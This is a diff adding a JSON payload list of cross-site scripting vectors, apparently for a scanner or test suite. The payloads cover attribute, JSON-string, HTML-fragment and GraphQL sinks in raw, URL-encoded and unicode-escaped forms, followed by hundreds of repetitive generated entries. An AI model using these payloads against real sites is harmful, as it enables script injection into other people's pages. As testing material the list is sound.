@@ -1,0 +1,1604 @@
+{
+  "vectors": [
+    {
+      "sink": "attribute_value",
+      "payload": "\" onfocus=XSSCANARY autofocus=\""
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "%22%20onfocus%3DXSSCANARY%20autofocus%3D%22"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "%22%20onmouseover%3DXSSCANARY%20%22"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "\" onmouseover=XSSCANARY \""
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "' onfocus=alert(1) autofocus='"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "%27%20onfocus%3Dalert%281%29%20autofocus%3D%27"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "\"\\u003e\\u003cimg src=x onerror=XSSCANARY\\u003e"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "%22%3E%3Cimg%20src%3Dx%20onerror%3DXSSCANARY%3E"
+    },
+    {
+      "sink": "attribute_value",
+      "payload": "\"><img src=x onerror=XSSCANARY>"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "');XSSCANARY;//"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "%27%29%3BXSSCANARY%3B%2F%2F"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "%5C%27%29%3Bconfirm%281%29%3B%2F%2F"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "\\');confirm(1);//"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "%27%20%2B%20alert%281%29%20%2B%20%27"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "' + alert(1) + '"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "%5Cu0027%29%3BXSSCANARY%3B%2F%2F"
+    },
+    {
+      "sink": "json_string_breakout",
+      "payload": "\\u0027);XSSCANARY;//"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "\\u003cimg src=x onerror=XSSCANARY\\u003e"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "%3Cimg%20src%3Dx%20onerror%3DXSSCANARY%3E"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "<img src=x onerror=XSSCANARY>"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "%3Csvg%2Fonload%3DXSSCANARY%3E"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "<svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "\\u003csvg/onload=XSSCANARY\\u003e"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "%3Cdetails%20open%20ontoggle%3DXSSCANARY%3E"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "<details open ontoggle=XSSCANARY>"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "\\u003cdetails open ontoggle=XSSCANARY\\u003e"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "<iframe srcdoc=\"<script>XSSCANARY</script>\">"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "%3Ciframe%20srcdoc%3D%22%3Cscript%3EXSSCANARY%3C%2Fscript%3E%22%3E"
+    },
+    {
+      "sink": "html_fragment",
+      "payload": "\\u003ciframe srcdoc=\"\\u003cscript\\u003eXSSCANARY\\u003c/script\\u003e\"\\u003e"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "%3Cb%3EXSSCANARY%3C%2Fb%3E"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "<b>XSSCANARY</b>"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "\\u003cb\\u003eXSSCANARY\\u003c/b\\u003e"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "%22%3E%3Cscript%3EXSSCANARY%3C%2Fscript%3E"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "\"><script>XSSCANARY</script>"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "\"\\u003e\\u003cscript\\u003eXSSCANARY\\u003c/script\\u003e"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "</script><script>XSSCANARY</script>"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "%3C%2Fscript%3E%3Cscript%3EXSSCANARY%3C%2Fscript%3E"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "\\u003c/script\\u003e\\u003cscript\\u003eXSSCANARY\\u003c/script\\u003e"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "%24%7BXSSCANARY%7D"
+    },
+    {
+      "sink": "graphql_search_query",
+      "payload": "${XSSCANARY}"
+    },
+    {
+      "sink": "generated",
+      "payload": "test0\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test1\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test2\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test3\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test4\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test5\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test6\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test7\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test8\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test9\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test10\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test11\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test12\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test13\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test14\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test15\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test16\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test17\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test18\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test19\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test20\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test21\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test22\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test23\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test24\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test25\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test26\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test27\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test28\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test29\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test30\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test31\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test32\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test33\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test34\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test35\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test36\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test37\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test38\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test39\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test40\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test41\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test42\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test43\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test44\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test45\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test46\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test47\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test48\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test49\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test50\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test51\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test52\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test53\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test54\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test55\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test56\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test57\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test58\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test59\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test60\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test61\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test62\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test63\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test64\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test65\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test66\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test67\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test68\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test69\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test70\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test71\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test72\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test73\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test74\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test75\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test76\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test77\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test78\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test79\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test80\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test81\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test82\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test83\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test84\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test85\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test86\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test87\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test88\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test89\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test90\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test91\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test92\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test93\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test94\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test95\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test96\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test97\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test98\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test99\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test100\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test101\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test102\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test103\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test104\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test105\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test106\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test107\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test108\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test109\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test110\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test111\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test112\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test113\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test114\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test115\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test116\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test117\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test118\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test119\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test120\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test121\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test122\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test123\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test124\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test125\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test126\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test127\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test128\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test129\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test130\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test131\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test132\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test133\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test134\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test135\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test136\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test137\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test138\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test139\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test140\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test141\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test142\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test143\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test144\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test145\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test146\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test147\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test148\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test149\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test150\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test151\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test152\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test153\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test154\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test155\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test156\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test157\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test158\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test159\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test160\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test161\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test162\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test163\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test164\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test165\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test166\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test167\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test168\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test169\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test170\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test171\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test172\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test173\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test174\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test175\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test176\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test177\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test178\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test179\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test180\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test181\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test182\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test183\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test184\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test185\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test186\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test187\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test188\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test189\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test190\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test191\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test192\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test193\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test194\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test195\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test196\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test197\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test198\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test199\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test200\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test201\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test202\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test203\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test204\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test205\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test206\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test207\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test208\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test209\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test210\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test211\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test212\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test213\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test214\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test215\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test216\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test217\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test218\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test219\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test220\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test221\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test222\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test223\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test224\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test225\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test226\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test227\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test228\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test229\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test230\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test231\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test232\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test233\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test234\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test235\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test236\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test237\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test238\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test239\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test240\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test241\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test242\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test243\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test244\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test245\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test246\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test247\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test248\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test249\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test250\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test251\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test252\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test253\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test254\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test255\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test256\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test257\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test258\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test259\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test260\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test261\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test262\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test263\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test264\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test265\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test266\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test267\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test268\"><svg/onload=XSSCANARY>"
+    },
+    {
+      "sink": "generated",
+      "payload": "test269\"><svg/onload=XSSCANARY>"
+    },
+    {
